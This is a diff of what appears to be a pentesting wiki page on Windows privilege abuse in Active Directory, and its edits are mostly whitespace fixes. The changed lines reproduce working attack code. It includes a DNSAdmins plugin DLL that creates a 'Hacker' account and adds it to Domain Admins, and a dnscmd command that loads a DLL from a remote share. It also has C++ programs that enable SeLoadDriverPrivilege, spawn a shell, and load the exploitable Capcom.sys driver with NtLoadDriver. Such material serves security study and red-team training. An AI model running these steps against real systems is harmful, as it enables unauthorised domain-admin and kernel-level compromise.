@@ -93,13 +93,13 @@ dnscmd [dc.computername] /config /serverlevelplugindll c:\path\to\DNSAdmin-DLL.d
 dnscmd [dc.computername] /config /serverlevelplugindll \\1.2.3.4\share\DNSAdmin-DLL.dll
 ```
 
-An example of a valid DLL can be found in [https://github.com/kazkansouh/DNSAdmin-DLL](https://github.com/kazkansouh/DNSAdmin-DLL). I would change the code of the function `DnsPluginInitialize`  to something like:
+An example of a valid DLL can be found in [https://github.com/kazkansouh/DNSAdmin-DLL](https://github.com/kazkansouh/DNSAdmin-DLL). I would change the code of the function `DnsPluginInitialize` to something like:
 
 ```c
 DWORD WINAPI DnsPluginInitialize(PVOID pDnsAllocateFunction, PVOID pDnsFreeFunction)
 {
-		system("C:\\Windows\\System32\\net.exe user Hacker T0T4llyrAndOm... /add /domain");
-		system("C:\\Windows\\System32\\net.exe group \"Domain Admins\" Hacker /add /domain");
+        system("C:\\Windows\\System32\\net.exe user Hacker T0T4llyrAndOm... /add /domain");
+        system("C:\\Windows\\System32\\net.exe group \"Domain Admins\" Hacker /add /domain");
 }
 ```
 
@@ -126,7 +126,7 @@ Get-ADObject -filter 'isDeleted -eq $true' -includeDeletedObjects -Properties *
 
 ## Group Managed Service Accounts \(gMSA\)
 
- In most of the infrastructures, service accounts are typical user accounts with “**Password never expire**” option. Maintaining these accounts could be a real mess and that's why Microsoft introduced  **Managed Service Accounts:**
+In most of the infrastructures, service accounts are typical user accounts with “**Password never expire**” option. Maintaining these accounts could be a real mess and that's why Microsoft introduced **Managed Service Accounts:**
 
 * No more password management. It uses a complex, random, 240-character password and changes that automatically when it reaches the domain or computer password expire date. 
   * It is uses Microsoft Key Distribution Service \(KDC\) to create and manage the passwords for the gMSA.
@@ -135,7 +135,7 @@ Get-ADObject -filter 'isDeleted -eq $true' -includeDeletedObjects -Properties *
 * Can use to run schedule tasks \(Managed service accounts do not support to run schedule tasks\)
 * Simplified SPN Management – System will automatically change the SPN value if **sAMaccount** details of the computer change or DNS name property change.
 
- gMSA accounts have their passwords stored in a LDAP property called _**msDS-ManagedPassword**_ which **automatically** get **resets** by the DC’s every 30 days, are **retrievable** by **authorized administrators** and by the **servers** who they are installed on. _**msDS-ManagedPassword**_ is an encrypted data blob called [MSDS-MANAGEDPASSWORD\_BLOB](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/a9019740-3d73-46ef-a9ae-3ea8eb86ac2e) and it’s only retrievable when the connection is secured, **LDAPS** or when the authentication type is ‘Sealing & Secure’ for an example.
+  gMSA accounts have their passwords stored in a LDAP property called _**msDS-ManagedPassword**_ which **automatically** get **resets** by the DC’s every 30 days, are **retrievable** by **authorized administrators** and by the **servers** who they are installed on. _**msDS-ManagedPassword**_ is an encrypted data blob called [MSDS-MANAGEDPASSWORD\_BLOB](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/a9019740-3d73-46ef-a9ae-3ea8eb86ac2e) and it’s only retrievable when the connection is secured, **LDAPS** or when the authentication type is ‘Sealing & Secure’ for an example.
 
 ![Image from https://cube0x0.github.io/Relaying-for-gMSA/](../../.gitbook/assets/asd1.png)
 
@@ -163,41 +163,41 @@ However, the below code allows enabling that privilege fairly easily:
 
 int main()
 {
-	TOKEN_PRIVILEGES tp;
-	LUID luid;
-	bool bEnablePrivilege(true);
-	HANDLE hToken(NULL);
-	OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken);
+    TOKEN_PRIVILEGES tp;
+    LUID luid;
+    bool bEnablePrivilege(true);
+    HANDLE hToken(NULL);
+    OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken);
 
-	if (!LookupPrivilegeValue(
-		NULL,            // lookup privilege on local system
-		L"SeLoadDriverPrivilege",   // privilege to lookup 
-		&luid))        // receives LUID of privilege
-	{
-		printf("LookupPrivilegeValue error: %un", GetLastError());
-		return FALSE;
-	}
-	tp.PrivilegeCount = 1;
-	tp.Privileges[0].Luid = luid;
-	
-	if (bEnablePrivilege) {
-		tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
-	}
-	
-	// Enable the privilege or disable all privileges.
-	if (!AdjustTokenPrivileges(
-		hToken,
-		FALSE,
-		&tp,
-		sizeof(TOKEN_PRIVILEGES),
-		(PTOKEN_PRIVILEGES)NULL,
-		(PDWORD)NULL))
-	{
-		printf("AdjustTokenPrivileges error: %x", GetLastError());
-		return FALSE;
-	}
+    if (!LookupPrivilegeValue(
+        NULL,            // lookup privilege on local system
+        L"SeLoadDriverPrivilege",   // privilege to lookup 
+        &luid))        // receives LUID of privilege
+    {
+        printf("LookupPrivilegeValue error: %un", GetLastError());
+        return FALSE;
+    }
+    tp.PrivilegeCount = 1;
+    tp.Privileges[0].Luid = luid;
 
-	system("cmd");
+    if (bEnablePrivilege) {
+        tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
+    }
+
+    // Enable the privilege or disable all privileges.
+    if (!AdjustTokenPrivileges(
+        hToken,
+        FALSE,
+        &tp,
+        sizeof(TOKEN_PRIVILEGES),
+        (PTOKEN_PRIVILEGES)NULL,
+        (PDWORD)NULL))
+    {
+        printf("AdjustTokenPrivileges error: %x", GetLastError());
+        return FALSE;
+    }
+
+    system("cmd");
     return 0;
 }
 ```
@@ -211,7 +211,7 @@ We compile the above, execute and the privilege `SeLoadDriverPrivilege` is now e
 
 To further prove the `SeLoadDriverPrivilege` is dangerous, let's **exploit it to elevate privileges**.
 
-You can load a new driver using  **NTLoadDriver:**
+You can load a new driver using **NTLoadDriver:**
 
 ```cpp
 NTSTATUS NTLoadDriver(
@@ -237,7 +237,7 @@ PCWSTR pPathSourceReg = L"\\Registry\\User\\<User-SID>\\System\\CurrentControlSe
 The first one declares a string variable indicating where the vulnerable **Capcom.sys** driver is located on the victim system and the second one is a string variable indicating a service name that will be used \(could be any service\).  
 Note, that the **driver must be signed by Windows** so you cannot load arbitrary drivers. But, **Capcom.sys** **can be abused to execute arbitrary code and is signed by Windows**, so the goal is to load this driver and exploit it.
 
- Load the driver:
+Load the driver:
 
 ```c
 #include "stdafx.h"
@@ -255,70 +255,70 @@ NTSTATUS(NTAPI *NtUnloadDriver)(IN PUNICODE_STRING DriverServiceName);
 
 int main()
 {
-	TOKEN_PRIVILEGES tp;
-	LUID luid;
-	bool bEnablePrivilege(true);
-	HANDLE hToken(NULL);
-	OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken);
+    TOKEN_PRIVILEGES tp;
+    LUID luid;
+    bool bEnablePrivilege(true);
+    HANDLE hToken(NULL);
+    OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken);
 
-	if (!LookupPrivilegeValue(
-		NULL,            // lookup privilege on local system
-		L"SeLoadDriverPrivilege",   // privilege to lookup 
-		&luid))        // receives LUID of privilege
-	{
-		printf("LookupPrivilegeValue error: %un", GetLastError());
-		return FALSE;
-	}
-	tp.PrivilegeCount = 1;
-	tp.Privileges[0].Luid = luid;
-	
-	if (bEnablePrivilege) {
-		tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
-	}
-	
-	// Enable the privilege or disable all privileges.
-	if (!AdjustTokenPrivileges(
-		hToken,
-		FALSE,
-		&tp,
-		sizeof(TOKEN_PRIVILEGES),
-		(PTOKEN_PRIVILEGES)NULL,
-		(PDWORD)NULL))
-	{
-		printf("AdjustTokenPrivileges error: %x", GetLastError());
-		return FALSE;
-	}
+    if (!LookupPrivilegeValue(
+        NULL,            // lookup privilege on local system
+        L"SeLoadDriverPrivilege",   // privilege to lookup 
+        &luid))        // receives LUID of privilege
+    {
+        printf("LookupPrivilegeValue error: %un", GetLastError());
+        return FALSE;
+    }
+    tp.PrivilegeCount = 1;
+    tp.Privileges[0].Luid = luid;
 
-	//system("cmd");
-	// below code for loading drivers is taken from https://github.com/killswitch-GUI/HotLoad-Driver/blob/master/NtLoadDriver/RDI/dll/NtLoadDriver.h
-	std::cout << "[+] Set Registry Keys" << std::endl;
-	NTSTATUS st1;
-	UNICODE_STRING pPath;
-	UNICODE_STRING pPathReg;
-	PCWSTR pPathSource = L"C:\\experiments\\privileges\\Capcom.sys";
+    if (bEnablePrivilege) {
+        tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
+    }
+
+    // Enable the privilege or disable all privileges.
+    if (!AdjustTokenPrivileges(
+        hToken,
+        FALSE,
+        &tp,
+        sizeof(TOKEN_PRIVILEGES),
+        (PTOKEN_PRIVILEGES)NULL,
+        (PDWORD)NULL))
+    {
+        printf("AdjustTokenPrivileges error: %x", GetLastError());
+        return FALSE;
+    }
+
+    //system("cmd");
+    // below code for loading drivers is taken from https://github.com/killswitch-GUI/HotLoad-Driver/blob/master/NtLoadDriver/RDI/dll/NtLoadDriver.h
+    std::cout << "[+] Set Registry Keys" << std::endl;
+    NTSTATUS st1;
+    UNICODE_STRING pPath;
+    UNICODE_STRING pPathReg;
+    PCWSTR pPathSource = L"C:\\experiments\\privileges\\Capcom.sys";
   PCWSTR pPathSourceReg = L"\\Registry\\User\\<User-SID>\\System\\CurrentControlSet\\MyService";
-	const char NTDLL[] = { 0x6e, 0x74, 0x64, 0x6c, 0x6c, 0x2e, 0x64, 0x6c, 0x6c, 0x00 };
-	HMODULE hObsolete = GetModuleHandleA(NTDLL);
-	*(FARPROC *)&RtlInitUnicodeString = GetProcAddress(hObsolete, "RtlInitUnicodeString");
-	*(FARPROC *)&NtLoadDriver = GetProcAddress(hObsolete, "NtLoadDriver");
-	*(FARPROC *)&NtUnloadDriver = GetProcAddress(hObsolete, "NtUnloadDriver");
+    const char NTDLL[] = { 0x6e, 0x74, 0x64, 0x6c, 0x6c, 0x2e, 0x64, 0x6c, 0x6c, 0x00 };
+    HMODULE hObsolete = GetModuleHandleA(NTDLL);
+    *(FARPROC *)&RtlInitUnicodeString = GetProcAddress(hObsolete, "RtlInitUnicodeString");
+    *(FARPROC *)&NtLoadDriver = GetProcAddress(hObsolete, "NtLoadDriver");
+    *(FARPROC *)&NtUnloadDriver = GetProcAddress(hObsolete, "NtUnloadDriver");
 
-	RtlInitUnicodeString(&pPath, pPathSource);
-	RtlInitUnicodeString(&pPathReg, pPathSourceReg);
-	st1 = NtLoadDriver(&pPathReg);
-	std::cout << "[+] value of st1: " << st1 << "\n";
-	if (st1 == ERROR_SUCCESS) {
-		std::cout << "[+] Driver Loaded as Kernel..\n";
-		std::cout << "[+] Press [ENTER] to unload driver\n";
-	}
+    RtlInitUnicodeString(&pPath, pPathSource);
+    RtlInitUnicodeString(&pPathReg, pPathSourceReg);
+    st1 = NtLoadDriver(&pPathReg);
+    std::cout << "[+] value of st1: " << st1 << "\n";
+    if (st1 == ERROR_SUCCESS) {
+        std::cout << "[+] Driver Loaded as Kernel..\n";
+        std::cout << "[+] Press [ENTER] to unload driver\n";
+    }
 
-	getchar();
-	st1 = NtUnloadDriver(&pPathReg);
-	if (st1 == ERROR_SUCCESS) {
-		std::cout << "[+] Driver unloaded from Kernel..\n";
-		std::cout << "[+] Press [ENTER] to exit\n";
-		getchar();
-	}
+    getchar();
+    st1 = NtUnloadDriver(&pPathReg);
+    if (st1 == ERROR_SUCCESS) {
+        std::cout << "[+] Driver unloaded from Kernel..\n";
+        std::cout << "[+] Press [ENTER] to exit\n";
+        getchar();
+    }
 
     return 0;
 }
@@ -346,33 +346,31 @@ Then, you will need to download a **Capcom.sys** exploit and use it to escalate 
 
 ## References <a id="references"></a>
 
-{% embed url="https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges" %}
+{% embed url="https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges" caption="" %}
 
-{% embed url="https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/" %}
+{% embed url="https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/" caption="" %}
 
-{% embed url="https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-b--privileged-accounts-and-groups-in-active-directory" %}
+{% embed url="https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-b--privileged-accounts-and-groups-in-active-directory" caption="" %}
 
-{% embed url="https://docs.microsoft.com/en-us/windows/desktop/secauthz/enabling-and-disabling-privileges-in-c--" %}
+{% embed url="https://docs.microsoft.com/en-us/windows/desktop/secauthz/enabling-and-disabling-privileges-in-c--" caption="" %}
 
-{% embed url="https://adsecurity.org/?p=3658" %}
+{% embed url="https://adsecurity.org/?p=3658" caption="" %}
 
-{% embed url="http://www.harmj0y.net/blog/redteaming/abusing-gpo-permissions/" %}
+{% embed url="http://www.harmj0y.net/blog/redteaming/abusing-gpo-permissions/" caption="" %}
 
-{% embed url="https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/" %}
+{% embed url="https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/" caption="" %}
 
-{% embed url="https://rastamouse.me/2019/01/gpo-abuse-part-1/" %}
+{% embed url="https://rastamouse.me/2019/01/gpo-abuse-part-1/" caption="" %}
 
-{% embed url="https://github.com/killswitch-GUI/HotLoad-Driver/blob/master/NtLoadDriver/EXE/NtLoadDriver-C%2B%2B/ntloaddriver.cpp\#L13" %}
+{% embed url="https://github.com/killswitch-GUI/HotLoad-Driver/blob/master/NtLoadDriver/EXE/NtLoadDriver-C%2B%2B/ntloaddriver.cpp\#L13" caption="" %}
 
-{% embed url="https://github.com/tandasat/ExploitCapcom" %}
+{% embed url="https://github.com/tandasat/ExploitCapcom" caption="" %}
 
-{% embed url="https://github.com/TarlogicSecurity/EoPLoadDriver/blob/master/eoploaddriver.cpp" %}
+{% embed url="https://github.com/TarlogicSecurity/EoPLoadDriver/blob/master/eoploaddriver.cpp" caption="" %}
 
-{% embed url="https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys" %}
+{% embed url="https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys" caption="" %}
 
-{% embed url="https://posts.specterops.io/a-red-teamers-guide-to-gpos-and-ous-f0d03976a31e" %}
+{% embed url="https://posts.specterops.io/a-red-teamers-guide-to-gpos-and-ous-f0d03976a31e" caption="" %}
 
-{% embed url="https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FExecutable%20Images%2FNtLoadDriver.html" %}
-
-
+{% embed url="https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FExecutable%20Images%2FNtLoadDriver.html" caption="" %}
 
